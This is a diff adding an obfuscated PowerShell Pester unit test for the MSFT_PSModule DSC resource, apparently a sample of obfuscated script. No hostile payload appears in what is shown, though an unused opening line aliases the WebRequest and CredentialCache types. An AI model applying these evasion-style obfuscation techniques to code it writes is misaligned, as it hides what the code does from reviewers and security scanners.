@@ -1,0 +1,739 @@
+&("{0}{1}{2}" -f 'se','T-Ite','M')  ("{2}{1}{3}{0}"-f 'Wd8o3','IAbl','VAr','e:V')  ( [TYPe]("{1}{0}{2}{3}"-F 'wEbr','systEM.Net.','E','qUeSt')  ); &("{0}{1}"-f'se','T-IteM')  ("{1}{0}{3}{2}"-f'I','VAr','BLE:WrE2D','A') (  [TYpe]("{6}{3}{1}{2}{4}{5}{0}"-f 'TiALCacHE','.nEt','.cRE','ySTem','d','en','S') ) ;  
+
+${Sc`RipT:d`SC`m`ODUle`NamE} = 'DSC'
+${SC`Rip`T`:Ds`CRes`OURcen`AmE} = ("{3}{1}{2}{0}"-f 'Module','S','FT_PS','M')
+
+
+${S`cRIPT`:MoDU`leROoT} = &("{1}{3}{0}{2}"-f'at','Spl','h','it-P') -Parent (&("{2}{0}{1}" -f 'pli','t-Path','S') -Parent ${pSScRi`Pt`R`OOT})
+if ( (-not (&("{3}{2}{1}{0}" -f'h','at','P','Test-') -Path (&("{2}{0}{1}"-f '-Pat','h','Join') -Path ${sCRi`Pt`:mo`duler`OoT} -ChildPath ("{5}{1}{2}{0}{4}{3}" -f'e.Tes','CRe','sourc','s','t','DS')))) -or `
+    (-not (&("{2}{0}{1}"-f 'es','t-Path','T') -Path (&("{2}{0}{1}" -f'in-Pat','h','Jo') -Path ${Scr`I`pt:moDuL`EROOt} -ChildPath ((("{6}{8}{0}{5}{2}{7}{1}{4}{3}{9}"-f'c','lper','s','sm','.p','bwTe','DSCResour','tHe','ce.Tests','1'))-crePlaCE  'cbw',[CHAr]92)))) ) {
+    & ("{0}{1}" -f 'g','it') @(("{1}{0}" -f'e','clon'), ("{5}{2}{12}{11}{1}{9}{6}{8}{7}{3}{10}{13}{4}{0}" -f 'it','cRe','tps://github.co','.','.g','ht','r','e','c','sou','Tes','PowerShell/Ds','m/','ts'), (&("{1}{2}{0}"-f 'h','Join-P','at') -Path ${sC`RiP`T:Modu`LE`RO`oT} -ChildPath ("{2}{1}{0}{3}"-f'cReso','s','D','urce.Tests')))
+}
+
+&("{2}{1}{4}{3}{0}" -f'odule','mpo','I','t-M','r') -Name (&("{3}{0}{2}{1}" -f'o','-Path','in','J') -Path ${sCRI`pt:m`odU`le`ROOt} -ChildPath (&("{1}{2}{0}"-f'th','Joi','n-Pa') -Path ("{2}{3}{0}{1}"-f 'es','ts','DSC','Resource.T') -ChildPath ("{2}{1}{3}{0}" -f '1','t','Tes','Helper.psm'))) -Force
+
+${T`eS`TenVIrOnment} = &("{0}{5}{3}{1}{4}{2}"-f'Initialize-T','on','nt','Envir','me','est') `
+    -DSCModuleName ${SC`R`ipt`:dsCmo`DulENaME} `
+    -DSCResourceName ${s`CRIP`T:Ds`CResOUrCE`N`AME} `
+    -ResourceType 'Mof' `
+    -TestType ("{0}{1}" -f 'Un','it')
+
+
+
+function I`NV`oK`E-te`stsetuP {
+}
+
+function IN`VOK`E-testclEa`NUP {
+    &("{2}{1}{4}{0}{3}{5}"-f'ir','tore-','Res','on','TestEnv','ment') -TestEnvironment ${tEsTen`VIR`On`ME`NT}
+}
+
+
+try {
+    &("{3}{2}{1}{0}"-f'up','estSet','nvoke-T','I')
+
+    &("{1}{0}{3}{2}{4}" -f'nModul','I','S','e','cope') ${ScRi`pt`:`d`SCrES`ouR`CEnamE} {
+        ${moc`kMOduL`e`NamE} = ("{0}{1}{3}{2}" -f 'M','oc','dModule','ke')
+        ${MO`C`krEPoSitorY`NaMe} = ("{1}{0}{2}" -f 'Ga','PS','llery')
+        ${moc`K`Modu`leB`Ase} = ((("{4}{2}{0}{6}{5}{1}{3}" -f 'iv','ckPat','tDr','h','Tes','3DMo','e:b'))  -crepLaCE'b3D',[chAr]92)
+
+        ${MockMOD`U`le`_v1} = &("{2}{1}{0}" -f'bject','-O','New') -TypeName ("{1}{0}"-f't','Objec') |
+            &("{2}{1}{0}" -f'er','b','Add-Mem') -Name ("{1}{0}"-f 'me','Na') -MemberType ("{0}{1}{2}"-f'NoteProp','er','ty') -Value ${mocKM`odU`Len`AME} -PassThru |
+            &("{0}{2}{3}{1}"-f'Add','er','-M','emb') -Name ("{0}{2}{1}"-f'D','tion','escrip') -MemberType ("{3}{1}{2}{0}" -f'y','te','Propert','No') -Value ("{1}{0}{3}{2}{4}" -f 'oc','M','rip','ked desc','tion') -PassThru |
+            &("{3}{1}{0}{2}" -f'm','e','ber','Add-M') -Name ("{0}{1}"-f 'Gu','id') -MemberType ("{1}{0}{2}"-f 'Prop','Note','erty') -Value ("{4}{6}{7}{8}{2}{3}{0}{1}{5}" -f '42','3','c0-d','682','4c','c5fc7','189','dbd-','d858-4893-ba') -PassThru |
+            &("{0}{1}{2}"-f'Add','-M','ember') -Name ("{2}{0}{1}" -f'dul','eBase','Mo') -MemberType ("{0}{2}{1}" -f 'No','erty','teProp') -Value ${m`OCk`mO`duLe`BaSE} -PassThru |
+            &("{0}{2}{1}" -f'Add-','mber','Me') -Name ("{1}{0}{2}{3}" -f'd','Mo','uleTy','pe') -MemberType ("{1}{0}{2}" -f 'Propert','Note','y') -Value ("{0}{1}" -f'Scr','ipt') -PassThru |
+            &("{0}{1}{2}" -f'Add-Me','mbe','r') -Name ("{0}{1}"-f'A','uthor') -MemberType ("{0}{2}{1}{3}" -f'N','tePrope','o','rty') -Value ("{1}{2}{0}"-f'r','M','ocked Autho') -PassThru |
+            &("{2}{0}{1}{3}"-f'-','Me','Add','mber') -Name ("{1}{0}{2}"-f'io','Vers','n') -MemberType ("{2}{0}{1}{3}"-f 'te','Pr','No','operty') -Value ([System.Version]("{1}{0}{2}"-f'.0.0','1','.0')) -PassThru -Force
+
+        ${M`ocK`MO`d`UlE_v2} = &("{2}{0}{1}"-f'e','w-Object','N') -TypeName ("{2}{0}{1}" -f'bj','ect','O') |
+            &("{0}{1}{2}" -f'Add-','Memb','er') -Name ("{0}{1}" -f'Nam','e') -MemberType ("{1}{2}{3}{0}"-f 'perty','No','tePr','o') -Value ${m`OckMo`dUL`eNaMe} -PassThru |
+            &("{1}{2}{0}"-f'er','Add-M','emb') -Name ("{1}{2}{0}" -f 'n','Descri','ptio') -MemberType ("{2}{3}{1}{0}"-f 'perty','Pro','No','te') -Value ("{3}{2}{1}{0}" -f 'tion','p','cked descri','Mo') -PassThru |
+            &("{0}{2}{1}"-f'Add-Me','r','mbe') -Name ("{0}{1}" -f'G','uid') -MemberType ("{2}{0}{1}"-f'Pro','perty','Note') -Value ("{6}{7}{2}{5}{4}{8}{0}{1}{3}" -f 'ac0-d682423','c','8-','5fc7','3','489','4c189dbd','-d85','-b') -PassThru |
+            &("{0}{1}{2}"-f 'A','dd-Membe','r') -Name ("{0}{2}{1}"-f 'M','ase','oduleB') -MemberType ("{3}{0}{2}{1}" -f 'otePr','rty','ope','N') -Value ${mO`CKmoDUL`eBA`Se} -PassThru |
+            &("{3}{2}{0}{1}" -f'b','er','-Mem','Add') -Name ("{2}{0}{1}" -f'd','uleType','Mo') -MemberType ("{2}{0}{1}"-f'oteProper','ty','N') -Value ("{1}{0}{2}"-f 'p','Scri','t') -PassThru |
+            &("{2}{0}{1}" -f'embe','r','Add-M') -Name ("{0}{1}"-f'Au','thor') -MemberType ("{3}{0}{1}{2}" -f 'r','opert','y','NoteP') -Value ("{1}{0}{2}"-f 'o','Mocked Auth','r') -PassThru |
+            &("{0}{1}{2}"-f 'A','dd','-Member') -Name ("{1}{0}"-f'n','Versio') -MemberType ("{1}{3}{2}{0}"-f'rty','Note','rope','P') -Value ([System.Version]("{0}{1}"-f '2.0.0','.0')) -PassThru -Force
+
+        ${m`Ockg`AlLeRyMO`Du`le} = &("{1}{2}{0}"-f'ct','New','-Obje') -TypeName ("{1}{3}{0}{2}" -f 'stomObje','PSC','ct','u') |
+            &("{2}{1}{3}{0}"-f 'ember','-','Add','M') -Name ("{0}{1}"-f'Na','me') -MemberType ("{2}{1}{0}" -f'teProperty','o','N') -Value ${m`Oc`Kmo`DuLeName} -PassThru |
+            &("{1}{0}{2}"-f 'mb','Add-Me','er') -Name ("{0}{3}{1}{2}"-f 'Repo','tor','y','si') -MemberType ("{3}{0}{1}{2}" -f'op','ert','y','NotePr') -Value ("{1}{0}{2}"-f 'aller','PSG','y') -PassThru |
+            &("{1}{2}{0}"-f'r','Add-M','embe') -Name ("{0}{1}{2}" -f'Ve','r','sion') -MemberType ("{2}{1}{3}{0}" -f 'perty','te','No','Pro') -Value ([System.Version]("{1}{0}" -f'0','3.0.0.')) -PassThru -Force
+
+        ${MoC`kG`etRi`GhTMOD`ULE_S`Ing`LE`MoDu`lE} = {
+            return @(${mock`ModU`le_`V1})
+        }
+
+        ${MOC`KgeTrIGH`T`MoDuLe_Mu`LtIPLE`m`ODulES} = {
+            return @(
+                ${m`ocKMoDu`LE_`V1}
+                ${moc`kM`ODU`L`e_V2}
+            )
+        }
+
+        ${mOc`kgETmODULe_SiN`gLemOd`U`le} = {
+            return @(${Mo`ckm`oDul`E`_V1})
+        }
+
+        ${MO`CkgE`TmoD`ULE`_mu`l`Tiple`MOd`Ules} = {
+            return @(
+                ${m`o`cKMO`Dule_v1}
+                ${m`oC`kM`O`Dule_V2}
+            )
+        }
+
+        ${m`OCkg`Et`MODule`RE`POs`iTorYNa`me} = {
+            return ${mo`CKRe`PO`SitoRy`Na`Me}
+        }
+
+        ${M`oCkgetINs`TalLaTiO`NPo`LIC`Y_TrUs`Ted} = {
+            return ${t`RuE}
+        }
+
+        ${MOC`Kg`EtiNSTAlLatI`onPOlIc`y_no`Ttru`steD} = {
+            return ${FA`Lse}
+        }
+
+        ${mOckf`i`Nd`mO`dule} = {
+            return ${moc`KGA`l`LEr`yM`OduLe}
+        }
+
+        &("{2}{0}{1}"-f 'esc','ribe','D') ((("{4}{3}{5}{6}{2}{1}{0}"-f 'source','rgetRe','t-Ta','S','M','FT_PSModulen','ZGGe')) -RePLaCe 'nZG',[CHAr]92) -Tag 'Get','BVT' {
+            &("{1}{0}" -f'ext','Cont') ("{7}{3}{0}{10}{6}{1}{5}{2}{8}{11}{4}{9}" -f 'th','st','m is i',' ','ta','e',' sy','When','n the desi','te','e','red s') {
+                &("{0}{2}{1}" -f 'Con','xt','te') ("{7}{1}{4}{0}{6}{5}{2}{3}{8}" -f'e c','n','on',' ',' th','igurati','onf','Whe','is present') {
+                    &("{1}{0}" -f'ontext','C') ("{4}{3}{5}{1}{2}{0}"-f 'd',' is',' truste',' the m','When','odule') {
+                        &("{0}{2}{1}" -f'B','eEach','efor') {
+                            &("{1}{0}" -f 'ock','M') -CommandName ("{2}{3}{1}{0}"-f 'le','odu','Get','-RightM') -MockWith ${M`ockGEtr`iG`H`TmOdu`LE_SI`NGL`EMOdU`le}
+                            &("{1}{0}"-f'ck','Mo') -CommandName ("{2}{1}{0}{5}{6}{4}{3}" -f 'od','-M','Get','me','RepositoryNa','ul','e') -MockWith ${m`oCkgEt`Mo`Dule`Re`P`oSitorYN`Ame}
+                            &("{1}{0}" -f 'ck','Mo') -CommandName ("{1}{0}{3}{2}{4}" -f'et-I','G','ationPol','nstall','icy') -MockWith ${moCKgE`T`InsTa`l`L`At`i`o`Npo`LiCY_`TRUSTeD}
+                        }
+
+                        &('It') ("{0}{6}{14}{13}{4}{1}{8}{12}{10}{9}{11}{3}{15}{2}{5}{7}"-f 'Shou','the sa','as','passe','rn ',' paramete','l','rs','me','lues as','a',' ',' v','tu','d re','d ') {
+                            ${GET`TargeTREsOU`RCERe`Su`lT} = &("{1}{5}{3}{0}{2}{4}"-f'rget','G','Resou','a','rce','et-T') -Name ${m`O`CkmoDuLeN`AmE}
+                            ${GEttaRgE`T`REsouRc`er`Es`U`lT}."na`mE" | &("{1}{0}"-f 'hould','S') -Be ${M`OckModULE`NAMe}
+
+                            &("{0}{3}{2}{1}" -f'As','t-MockCalled','r','se') -CommandName ("{1}{2}{0}"-f'dule','Get-','RightMo') -Exactly -Times 1 -Scope ('It')
+                            &("{1}{3}{0}{4}{2}"-f 'MockCa','Asser','d','t-','lle') -CommandName ("{0}{4}{5}{2}{1}{3}" -f'Get-Module','yNa','r','me','Re','posito') -Exactly -Times 1 -Scope ('It')
+                            &("{2}{3}{1}{0}{4}"-f 'a','ckC','Ass','ert-Mo','lled') -CommandName ("{3}{0}{1}{2}"-f '-Insta','llationPol','icy','Get') -Exactly -Times 1 -Scope ('It')
+                        }
+
+                        &('It') ("{16}{14}{5}{10}{2}{1}{6}{11}{3}{4}{13}{9}{12}{7}{8}{17}{0}{15}"-f 'e','t','e','h','e co',' ','urn','other prop','ert','for the','r',' t',' ','rrect values ','ould','s','Sh','i') {
+                            ${gettaRGe`Tr`E`sOur`c`ER`E`sUlT} = &("{3}{0}{2}{1}" -f 'R','source','e','Get-Target') -Name ${mockm`oDU`Le`NA`mE}
+
+                            ${GE`T`Ta`R`geTrE`SO`URcERe`sulT}."EN`SUre" | &("{0}{2}{1}"-f'S','ould','h') -Be ("{0}{1}" -f 'Pr','esent')
+                            ${g`eT`T`ARGe`T`REsoUrC`EREsUlt}."REPOs`ITO`Ry" | &("{1}{0}" -f 'ould','Sh') -Be ${mO`C`kREPO`SITO`RYn`Ame}
+                            ${geT`T`Arg`et`RESoURCEreSult}."De`Sc`R`IptiON" | &("{0}{1}"-f'Sho','uld') -Be ${M`OCK`Mo`duLE_`V1}."D`escrI`ptiOn"
+                            ${g`EttaRGEtREs`OU`RcE`RES`UlT}."gU`id" | &("{0}{1}" -f 'S','hould') -Be ${moc`K`mod`ULe_`V1}."Gu`iD"
+                            ${ge`Tta`R`getrE`sOU`RcErEsU`LT}."mOdulE`Ba`sE" | &("{1}{0}" -f 'd','Shoul') -Be ${mOCk`mOdu`LE_`V1}."M`odULeb`AsE"
+                            ${gET`TARGe`T`R`EsOur`ceR`eS`UlT}."mODuL`eT`y`pe" | &("{1}{0}"-f'uld','Sho') -Be ${mO`CkMod`ULE`_V1}."MO`d`Ule`TyPe"
+                            ${geTtA`RgETrESOUR`c`eREs`U`lT}."aUT`hOR" | &("{0}{1}"-f 'Shoul','d') -Be ${m`OCKmodu`Le`_`V1}."au`THoR"
+                            ${gettargE`TRE`sOURc`erEs`ULt}."I`Nst`AlLEdv`ersiON" | &("{0}{1}" -f'Sh','ould') -Be ${Mo`ckmod`UL`e_`V1}."verS`IoN"
+                            ${G`E`Tt`ArG`EtR`ESOUrC`eREsu`Lt}."INsTaLL`AT`i`O`NpoL`ICy" | &("{0}{1}" -f 'Sh','ould') -Be ("{2}{1}{0}"-f'd','te','Trus')
+
+                            &("{3}{0}{1}{2}{4}" -f '-Moc','kCal','le','Assert','d') -CommandName ("{3}{0}{1}{2}{4}" -f'RightM','odu','l','Get-','e') -Exactly -Times 1 -Scope ('It')
+                            &("{1}{4}{3}{0}{2}" -f '-Moc','A','kCalled','ert','ss') -CommandName ("{1}{5}{2}{0}{3}{4}" -f 'e','Ge','R','pos','itoryName','t-Module') -Exactly -Times 1 -Scope ('It')
+                            &("{1}{3}{0}{2}"-f't-Moc','A','kCalled','sser') -CommandName ("{0}{3}{1}{2}{4}"-f 'Get-Installat','on','Po','i','licy') -Exactly -Times 1 -Scope ('It')
+                        }
+                    }
+
+                    &("{0}{1}"-f'Conte','xt') ("{5}{6}{4}{2}{0}{1}{3}" -f 'ot',' ','dule is n','trusted','e mo','Wh','en th') {
+                        &("{1}{2}{0}" -f'h','Befor','eEac') {
+                            &("{0}{1}"-f 'M','ock') -CommandName ("{4}{0}{2}{3}{1}"-f 'et-RightM','ule','o','d','G') -MockWith ${mO`CKG`EtR`IgHTMO`Du`Le`_SInGLeM`o`DU`le}
+                            &("{1}{0}"-f 'ock','M') -CommandName ("{0}{3}{1}{4}{2}" -f 'Get','o','uleRepositoryName','-M','d') -MockWith ${Mo`c`k`GETmOD`ULeRe`POS`i`ToRYNA`Me}
+                            &("{1}{0}" -f 'ck','Mo') -CommandName ("{2}{4}{0}{3}{1}"-f'InstallationP','cy','G','oli','et-') -MockWith ${m`ockG`eT`InsTA`lLaT`IOnpol`IcY_n`oT`TruSTeD}
+                        }
+
+                        &('It') ("{5}{11}{2}{10}{9}{0}{3}{14}{8}{7}{12}{6}{15}{1}{13}{4}" -f 'h','et','ould','e','rs','S',' par','values as','e ','turn t',' re','h',' passed as','e',' sam','am') {
+                            ${GeTTArgETrE`so`UrcerE`s`ULt} = &("{4}{5}{2}{1}{0}{3}"-f'tR','ge','Tar','esource','Ge','t-') -Name ${M`ockm`o`D`ULeNAme}
+                            ${GE`TtArgE`TResOU`Rcer`ESulT}."na`me" | &("{0}{1}"-f 'Sh','ould') -Be ${m`o`C`kMODUlEN`AME}
+
+                            &("{0}{2}{1}{3}" -f'As','ockCalle','sert-M','d') -CommandName ("{0}{2}{1}"-f'Get-Rig','odule','htM') -Exactly -Times 1 -Scope ('It')
+                            &("{4}{1}{0}{5}{2}{3}" -f't-Mock','sser','l','ed','A','Cal') -CommandName ("{6}{3}{0}{2}{5}{4}{1}"-f'Module','oryName','R','-','posit','e','Get') -Exactly -Times 1 -Scope ('It')
+                            &("{2}{0}{1}{5}{4}{3}" -f'rt','-','Asse','lled','ckCa','Mo') -CommandName ("{4}{0}{1}{2}{3}{5}"-f 'et','-Installa','tio','n','G','Policy') -Exactly -Times 1 -Scope ('It')
+                        }
+
+                        &('It') ("{9}{6}{0}{5}{10}{1}{3}{8}{7}{2}{4}"-f 'urn',' v','opert','a','ies',' t','et','or the other pr','lues f','Should r','he correct') {
+                            ${gE`TTARg`etREsoU`RCeRE`SULt} = &("{2}{4}{0}{5}{1}{3}" -f'tR','our','Get-Targ','ce','e','es') -Name ${m`O`Ckmo`DULE`NaMe}
+
+                            ${G`e`TTar`GET`RESou`RcERes`Ult}."EN`sURE" | &("{1}{0}{2}"-f 'o','Sh','uld') -Be ("{1}{0}" -f 'ent','Pres')
+                            ${G`et`TaRGE`TRe`S`oURCe`R`eSUlt}."rEpO`SI`ToRy" | &("{0}{2}{1}"-f'S','ould','h') -Be ${m`o`ck`R`EpoSi`TorY`NAME}
+                            ${Ge`TTarg`EtrES`ourcE`ReSUlT}."dES`CR`iptioN" | &("{2}{0}{1}" -f'oul','d','Sh') -Be ${mO`cK`MOD`U`Le_v1}."DesCRI`P`T`Ion"
+                            ${GEtt`ARGetr`EsoUR`c`EResult}."G`UID" | &("{1}{0}{2}"-f'u','Sho','ld') -Be ${mo`c`kMOd`ULE_v1}."gu`Id"
+                            ${gEt`T`ARGET`Res`ouRcere`sUlT}."modu`lE`BASe" | &("{1}{2}{0}" -f'uld','S','ho') -Be ${Mo`cKmODU`lE_`V1}."M`oDU`LebASE"
+                            ${GE`Tt`ARGETr`e`SOu`RcEre`SuLT}."MOdUl`e`TYPE" | &("{0}{1}"-f'Sho','uld') -Be ${Mo`C`KmOd`ULE`_V1}."MO`dU`lEtYpe"
+                            ${gE`TTaRgetRE`s`oUr`cErESu`LT}."AuTH`or" | &("{1}{0}"-f'd','Shoul') -Be ${m`oc`k`Mo`DUlE_v1}."auT`HOr"
+                            ${g`EtTarG`etrESoUr`Ce`ReSUlT}."Ins`TaLL`EdVErsI`oN" | &("{1}{0}"-f 'ould','Sh') -Be ${moc`KmOdUl`e_`V1}."V`erSI`oN"
+                            ${GETtaRGEtRE`Sou`R`CErES`U`lt}."InsT`AL`L`AtIo`NPOli`cy" | &("{1}{0}" -f'ould','Sh') -Be ("{0}{2}{1}"-f'U','trusted','n')
+
+                            &("{4}{1}{3}{2}{5}{0}" -f'd','ckCa','l','l','Assert-Mo','e') -CommandName ("{3}{1}{2}{0}" -f 'ule','i','ghtMod','Get-R') -Exactly -Times 1 -Scope ('It')
+                            &("{0}{3}{1}{2}{4}" -f 'Assert-','ck','Ca','Mo','lled') -CommandName ("{2}{7}{4}{3}{1}{6}{5}{0}" -f'ryName','eR','Get','odul','M','posito','e','-') -Exactly -Times 1 -Scope ('It')
+                            &("{2}{3}{0}{1}" -f'll','ed','Assert-Mo','ckCa') -CommandName ("{1}{3}{5}{6}{2}{0}{4}" -f 'olic','G','nP','et-I','y','nstallat','io') -Exactly -Times 1 -Scope ('It')
+                        }
+                    }
+
+                    &("{0}{1}{2}" -f 'Co','nte','xt') ("{10}{9}{4}{11}{0}{5}{6}{2}{1}{3}{8}{7}" -f'sion of ','e','am',' ','re are mult','t','he s','e','modul','hen the','W','iple ver') {
+                        &("{3}{1}{0}{2}" -f'foreEa','e','ch','B') {
+                            &("{1}{0}" -f'k','Moc') -CommandName ("{2}{1}{3}{0}" -f 'e','ightM','Get-R','odul') -MockWith ${Mo`CkgETRIGHT`Mod`UlE_muL`T`ipl`EmodUleS}
+                            &("{1}{0}" -f 'ock','M') -CommandName ("{6}{5}{0}{1}{2}{3}{4}" -f 't-Mo','d','uleRepos','itoryNam','e','e','G') -MockWith ${moc`KgETmO`d`Ul`erEp`osit`oryN`A`ME}
+                            &("{0}{1}"-f'Moc','k') -CommandName ("{1}{4}{2}{6}{3}{0}{5}"-f 'i','Ge','lat','onPol','t-Instal','cy','i') -MockWith ${MO`cKGETi`NST`A`llA`Tio`NpOlicY_t`RusTEd}
+                        }
+
+                        &('It') ("{4}{9}{7}{6}{2}{10}{3}{1}{12}{0}{5}{8}{11}"-f ' as','s pass','e v','ues a','Should return t',' pa','sam',' ','ramet','he','al','ers','ed') {
+                            ${G`EttArGe`TRESoUR`CER`ES`ULt} = &("{3}{1}{0}{4}{2}"-f 'etResou','t-Targ','e','Ge','rc') -Name ${MocKmoD`ULen`AmE}
+                            ${GE`TTar`Get`RE`sO`URce`REsUlT}."nA`me" | &("{2}{0}{1}"-f 'ho','uld','S') -Be ${MO`CK`modU`LenaMe}
+
+                            &("{2}{4}{0}{3}{5}{1}" -f'-','led','As','Moc','sert','kCal') -CommandName ("{2}{1}{0}" -f 'ightModule','et-R','G') -Exactly -Times 1 -Scope ('It')
+                            &("{2}{3}{1}{4}{0}" -f'd','rt-MockC','Ass','e','alle') -CommandName ("{0}{3}{4}{2}{1}" -f'G','sitoryName','o','et-Modul','eRep') -Exactly -Times 1 -Scope ('It')
+                            &("{2}{4}{5}{0}{3}{1}"-f'kCa','d','A','lle','sse','rt-Moc') -CommandName ("{0}{1}{2}{5}{3}{6}{4}" -f 'Get','-Install','ati','ol','y','onP','ic') -Exactly -Times 1 -Scope ('It')
+                        }
+
+                        &('It') ("{0}{3}{4}{6}{1}{9}{2}{7}{8}{5}{10}"-f'S','ld return the c','ct m','h','o','e','u','odul','e v','orre','rsion') {
+                            ${GEtt`A`RGE`Treso`UR`cEReSUlt} = &("{0}{2}{1}{3}"-f'G','-Tar','et','getResource') -Name ${MoCKMODU`L`ENAme}
+
+                            ${GET`TA`RgeTreSO`U`RC`E`R`eSuLt}."i`NstALLeD`VErSiON" | &("{0}{1}{2}" -f'S','ho','uld') -Be ${MO`cKm`oD`Ule`_V2}."ver`S`ION"
+                        }
+
+                        &('It') ("{9}{6}{2}{10}{3}{4}{0}{7}{11}{1}{5}{8}" -f't','prop','l','return',' ','ert','ou','he correct val','ies','Sh','d ','ues for the other ') {
+                            ${g`Etta`Rget`ReSou`Rce`Resu`Lt} = &("{1}{4}{2}{0}{3}" -f'R','Ge','t','esource','t-Targe') -Name ${moCKMo`D`ULE`NAME}
+
+                            ${GETtaRgEt`Resou`RCer`eSU`lT}."En`SU`RE" | &("{0}{1}" -f'S','hould') -Be ("{2}{0}{1}" -f'e','nt','Pres')
+                            ${GEt`T`A`RGeTrEso`URcerESulT}."r`epOsi`ToRY" | &("{0}{1}" -f 'Sho','uld') -Be ${mOck`REpo`S`I`TOrYNA`Me}
+                            ${g`E`TTaRGe`TReS`ouR`ce`R`esuLt}."deSCri`pT`ION" | &("{1}{0}"-f'uld','Sho') -Be ${mO`CkMODUL`E_v2}."dESCr`IPt`iOn"
+                            ${GettARgEtRE`sO`U`RcE`REsULT}."g`UID" | &("{1}{0}" -f'hould','S') -Be ${mockm`OD`ULE_`V2}."GU`id"
+                            ${G`eT`T`ARGEtres`OurceReSUlT}."M`OdULebA`sE" | &("{0}{2}{1}" -f'Sho','d','ul') -Be ${moc`km`od`UlE_v2}."m`O`DUlEBASE"
+                            ${G`E`TTAR`Ge`TreSO`URCeR`E`suLT}."M`odUletY`PE" | &("{1}{0}"-f 'uld','Sho') -Be ${MoC`kmOD`ULe_`V2}."m`od`U`LetypE"
+                            ${gEt`TARG`etReso`UrC`EREs`U`lT}."AU`ThOr" | &("{0}{2}{1}"-f 'Sh','d','oul') -Be ${MO`c`kMODuLE`_V2}."aUt`h`Or"
+                            ${gEtTa`R`g`etreSOurceR`ES`U`LT}."I`NSTAl`l`AtiONPOLICy" | &("{1}{0}"-f'uld','Sho') -Be ("{2}{0}{1}"-f'us','ted','Tr')
+
+                            &("{3}{1}{4}{0}{2}"-f'alle','sert-Moc','d','As','kC') -CommandName ("{1}{0}{3}{4}{2}"-f'ght','Get-Ri','le','Mod','u') -Exactly -Times 1 -Scope ('It')
+                            &("{2}{1}{3}{0}" -f 'ed','-M','Assert','ockCall') -CommandName ("{5}{6}{2}{1}{3}{0}{4}" -f'Na','leReposi','du','tory','me','Get-','Mo') -Exactly -Times 1 -Scope ('It')
+                            &("{0}{1}{4}{2}{3}"-f 'Ass','ert-Moc','e','d','kCall') -CommandName ("{0}{4}{1}{2}{3}" -f'G','t-Inst','al','lationPolicy','e') -Exactly -Times 1 -Scope ('It')
+                        }
+                    }
+                }
+
+                &("{0}{1}"-f'Cont','ext') ("{0}{7}{4}{1}{5}{2}{6}{3}"-f'When ',' configura','n i','ent','e','tio','s abs','th') {
+                    &("{2}{1}{0}" -f'h','c','BeforeEa') {
+                        &("{0}{1}" -f'Moc','k') -CommandName ("{1}{3}{2}{0}"-f 'ghtModule','Get','i','-R')
+                        &("{1}{0}"-f 'ck','Mo') -CommandName ("{2}{0}{1}{6}{5}{3}{4}"-f 'epo','s','Get-ModuleR','am','e','toryN','i')
+                        &("{0}{1}"-f'Moc','k') -CommandName ("{4}{2}{1}{3}{5}{6}{0}"-f'nPolicy','n','-I','stall','Get','ati','o')
+                    }
+
+                    &('It') ("{6}{10}{12}{1}{8}{3}{9}{5}{4}{7}{2}{14}{13}{0}{11}"-f's','uld retu','es ','he sam','l','va','S','u','rn t','e ','h',' parameters','o','s passed a','a') {
+                        ${ge`Tta`RGeTR`ESO`UrC`eREsulT} = &("{4}{0}{1}{2}{3}"-f't-T','arget','R','esource','Ge') -Name ${m`OCKMODUle`NA`Me}
+                        ${Ge`T`TaRGETR`E`s`OU`RCereSUlt}."N`AmE" | &("{0}{1}"-f'Sh','ould') -Be ${MoCK`Mo`Du`LENaMe}
+                        ${geT`TAR`gEt`ResoUr`ceRe`SULt}."re`pos`IT`oRy" | &("{0}{1}"-f 'Shoul','d') -Be ${moCkREp`Os`I`Tor`y`NAME}
+
+                        &("{0}{2}{1}{3}"-f 'A','kC','ssert-Moc','alled') -CommandName ("{2}{0}{1}{3}"-f 'et','-RightMo','G','dule') -Exactly -Times 1 -Scope ('It')
+                        &("{0}{4}{2}{3}{1}" -f 'Asse','led','kC','al','rt-Moc') -CommandName ("{4}{0}{2}{5}{1}{3}"-f 'Modu','ito','le','ryName','Get-','Repos') -Exactly -Times 0 -Scope ('It')
+                        &("{0}{2}{3}{1}"-f'Assert-Mo','ed','c','kCall') -CommandName ("{1}{4}{2}{3}{0}"-f 'stallationPolicy','Ge','-I','n','t') -Exactly -Times 0 -Scope ('It')
+                    }
+
+                    &('It') ("{8}{2}{7}{3}{10}{6}{12}{1}{5}{0}{4}{9}{11}" -f 'h',' o','turn th','r','er','t','ct val','e cor','Should re',' ','e','properties','ues for the') {
+                        ${g`E`TtargETr`e`sOUrCerESu`lT} = &("{1}{0}{3}{2}"-f 'rg','Get-Ta','esource','etR') -Name ${MocKMO`duLEn`Ame}
+
+                        ${GEtT`AR`ge`T`RESoU`RC`ereSu`lt}."EN`sUrE" | &("{1}{0}" -f 'd','Shoul') -Be ("{0}{2}{1}"-f 'Ab','nt','se')
+                        ${GE`Tt`ArGE`TRE`SouR`CEResu`Lt}."DES`cr`IptION" | &("{1}{0}" -f'ould','Sh') -BeNullOrEmpty
+                        ${G`E`TTaRGetREsO`URC`ERESUlT}."GU`id" | &("{0}{1}" -f 'Shoul','d') -BeNullOrEmpty
+                        ${geTtaRGEt`R`eSOuR`C`E`RES`Ult}."Mo`d`UlEB`Ase" | &("{0}{1}{2}" -f 'S','hou','ld') -BeNullOrEmpty
+                        ${GE`Tt`ARG`ETrESO`URce`Re`sulT}."Modulet`Y`pE" | &("{1}{0}"-f 'hould','S') -BeNullOrEmpty
+                        ${ge`T`TarGeTrEsOuR`CERes`UlT}."AU`Thor" | &("{0}{1}" -f 'Shou','ld') -BeNullOrEmpty
+                        ${GeT`TarGe`T`Res`OUr`C`eres`UlT}."i`NsTALLEd`VeR`sIoN" | &("{0}{1}"-f'S','hould') -BeNullOrEmpty
+                        ${GEttar`Ge`T`RE`sOu`RCerES`UlT}."I`Ns`TALlATIoN`POl`icY" | &("{0}{1}"-f'Sho','uld') -BeNullOrEmpty
+                        ${gettaR`GeTRESOURce`R`EsU`lt}."reQUIRED`Ve`RSI`ON" | &("{2}{1}{0}" -f 'd','ul','Sho') -BeNullOrEmpty
+                        ${g`ettAr`g`etr`ESouR`c`eResuLt}."m`I`N`ImUMVErS`iON" | &("{0}{1}" -f'Shoul','d') -BeNullOrEmpty
+                        ${GeTTa`RGE`Tr`ESOU`RCeREsULT}."MAXiMU`MVE`R`SiOn" | &("{0}{1}"-f 'Sh','ould') -BeNullOrEmpty
+                        ${GetT`ArGeTreS`ouRc`ERESU`lT}."fOr`CE" | &("{1}{2}{0}"-f 'ould','S','h') -Be ${fA`LsE}
